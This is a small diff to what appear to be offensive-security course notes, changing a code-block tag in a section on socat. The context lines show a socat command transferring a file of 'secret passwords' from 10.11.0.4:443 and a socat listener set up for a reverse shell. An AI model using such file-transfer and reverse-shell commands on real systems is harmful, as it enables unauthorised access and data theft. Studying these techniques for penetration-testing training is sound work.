@@ -357,7 +357,7 @@ C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,cre
 #create - a new file will be created
 ```
 ### Socat Reverse Shells
-```console
+```cmd
 #local
 C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
 #-d -d: increase verbosity, STDOUT: connect standard output (STDOUT) to the TCP socket
